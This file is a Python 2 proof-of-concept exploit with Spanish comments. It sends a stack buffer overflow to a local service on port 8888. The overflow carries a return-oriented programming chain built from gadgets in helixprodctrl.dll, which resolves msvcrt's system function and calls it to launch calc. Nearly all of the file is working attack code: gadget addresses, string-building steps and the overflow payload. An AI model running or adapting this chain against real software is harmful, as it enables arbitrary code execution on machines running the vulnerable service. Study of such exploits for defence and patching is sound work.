import socket
import struct
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 8888))
def create_rop_chain():
	rop_gadgets = [
	
	    #store string system

		0x6044958a, #POP ECX #RETN [helixprodctrl.dll]
		0x74737973, #syst
		0x60437B3C, #POP EDI -ret
		0x60451C2B, #Destination vritable data addres to EDI
		0x60437B39, #MOV DWORD PTR DS:[EDI+4],ECX - POP EDI
		0x60451C2B+4, #Destination vritable data addres to EDI+4
		0x6044958a, #POP ECX # RETN [helixprodctrl.dll]
		0x00006D65, #em
		0x60437B39, #MOV DWORD PTR DS:[EDI+4],ECX - POP EDI
		0x90909090,
        
		#store string calc
		
		0x6044958a, #POP ECX #RETN [helixprodctrl.dll]
		0x636c6163, #calc
		0x60437B3C, #POP EDI -ret
		0x60451C20, #Destination vritable data addres to EDI
		0x60437B39, #MOV DWORD PTR DS:[EDI+4],ECX - POP EDI
		0x90909090,

		#Call to GetModuleHandlea for Get imagebase of msvcrt.dll
	
		0x60449479, #POP EAX # RETN 0x0C [helixprodctrl.dll]
		0x60450176, #pointer to msvcrt.dll string
		0x60449c17, #RETN [helixprodctrl.dll] padear 0x0C
		0x60449c17, #RETN [helixprodctrl.dll]
		0x60449c17, #RETN [helixprodctrl.dll]
		0x60449c17, #RETN [helixprodctrl.dll]
		0x6044958a, #POP ECX # RETN [helixprodctrl.dll]
		0x6044C074, #IAT GetModuleHandlea -8
		0x60432F08, #PUSH EAX-CALL [ECX+8]-RETN
	
		#Call to GetProcAddress to get the system Address
	
		0x60449c17, #RETN [helixprodctrl.dll]
		0x60449c17, #RETN [helixprodctrl.dll]
		0x60449c17, #RETN [helixprodctrl.dll]
		0x60449c17, #RETN [helixprodctrl.dll]
	
		0x6044958a, #POP ECX #RETN [helixprodctrl.dll]
		0x6044C074-8, #IAT GetProcAddress -8
	
		0x60431DC8, #C2 0800 RETN 8
		0x60432F08, #PUSH EAX-CALL [ECX+8]-RET	
		0x41414141, #Filler (RETN offset compensation)
		0x41414142, #Filler (RETN offset compensation)
		0x60451C2B+4, #Builded system String address
		0x60449c17, #RETN [helixprodctrl.dll]
	
		0x60449EDF, #CALL EAX
		0x60451C24, #ptr a string system
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop= create_rop_chain()
fruta = "A" * 256 + rop + "BBBB"
a = sock.recv(512)
print a
sock.send(fruta)
sock.close()
raw_input("Enter para salir")